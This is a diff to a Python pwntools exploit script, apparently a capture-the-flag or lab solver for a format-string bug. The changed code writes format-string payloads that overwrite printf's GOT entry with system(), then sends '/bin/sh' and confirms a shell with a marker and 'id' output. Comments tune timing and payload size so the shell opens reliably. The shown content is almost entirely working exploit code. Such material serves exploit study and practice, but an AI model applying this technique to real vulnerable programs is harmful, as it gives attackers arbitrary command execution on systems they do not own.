@@ -91,25 +91,38 @@ printf_got = elf.got["printf"] + pie_base
 
 if _page_writable(io.pid, printf_got):
     # Partial RELRO: printf@GOT is writable -> overwrite it with system so printf(buf)->system(buf).
-    for wsz in ("short", "byte"):
-        try:
-            payload = fmtstr_payload(offset, {printf_got: system}, write_size=wsz)
-            io.sendline(payload)
-            io.recvuntil(prompt, timeout=3)
-            io.sendline(b"/bin/sh")
-            io.sendline(b"echo " + MARK)
-            out = io.recvrepeat(2)
-            if MARK in out:
-                print("VERIFIED offset=%d system=%#x printf_got=%#x" % (offset, system, printf_got))
-                sys.exit(0)
-        except Exception:
-            pass
-        # reopen for next attempt
-        try: io.close()
-        except Exception: pass
-        io = process([elf.path], aslr=False)
-        try: io.recvuntil(prompt, timeout=2)
-        except Exception: pass
+    # Once the GOT is overwritten EVERY later printf (the "say: " prompt included) becomes a system()
+    # call, so the prompt stops appearing -- do NOT recvuntil(prompt) after the write (it only wastes
+    # the timeout and can desync the stream). Drain briefly, then feed '/bin/sh' as the next format
+    # string (-> system("/bin/sh")) and confirm with a marker AND a uid line. 'byte' writes first:
+    # 1-byte %n writes keep field widths small, so the payload stays well under the 127-byte buffer.
+    MAXBUF = 127
+    for _try in range(6):
+        for wsz in ("byte", "short"):
+            try:
+                payload = fmtstr_payload(offset, {printf_got: system}, write_size=wsz)
+            except Exception:
+                continue
+            if len(payload) > MAXBUF:            # must fit in read(buf, 127)
+                continue
+            try:
+                io.sendline(payload)             # round: printf(payload) -> printf@GOT = system
+                io.recvrepeat(0.5)               # drain the payload's own output (no prompt now)
+                io.sendline(b"/bin/sh")          # next round: printf("/bin/sh") -> system("/bin/sh")
+                io.recvrepeat(0.3)
+                io.sendline(b"echo " + MARK + b"; id")
+                out = io.recvrepeat(1.5)
+                if MARK in out or b"uid=" in out:
+                    print("VERIFIED offset=%d system=%#x printf_got=%#x" % (offset, system, printf_got))
+                    sys.exit(0)
+            except Exception:
+                pass
+            # reopen a fresh, prompt-synced process for the next attempt
+            try: io.close()
+            except Exception: pass
+            io = process([elf.path], aslr=False)
+            try: io.recvuntil(prompt, timeout=2)
+            except Exception: pass
     print("NOT_VERIFIED offset=%d" % offset)
     sys.exit(1)
 
